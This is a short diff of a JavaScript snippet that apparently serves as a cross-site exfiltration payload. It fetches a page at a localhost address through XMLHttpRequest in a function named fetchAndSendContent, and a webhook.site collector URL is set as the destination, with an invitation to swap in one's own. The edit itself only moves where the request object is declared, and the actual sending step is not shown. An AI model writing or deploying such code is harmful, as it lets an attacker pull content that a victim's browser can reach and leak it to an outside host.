@@ -2,10 +2,10 @@
 const TARGET_URL = "http://localhost/index.php";  // URL of the page you want to fetch
 const WEBHOOK_URL = "https://webhook.site/998b21e9-1fed-4da1-9818-67cfafdbfaae/";  // Replace with your webhook URL
 
+const xhrFetch = new XMLHttpRequest();
 // Create a new XMLHttpRequest object for fetching the page content
 async function fetchAndSendContent() {
   try {
-    const xhrFetch = new XMLHttpRequest();
     xhrFetch.open("GET", TARGET_URL, true);
     
     // Onload event for the fetch request
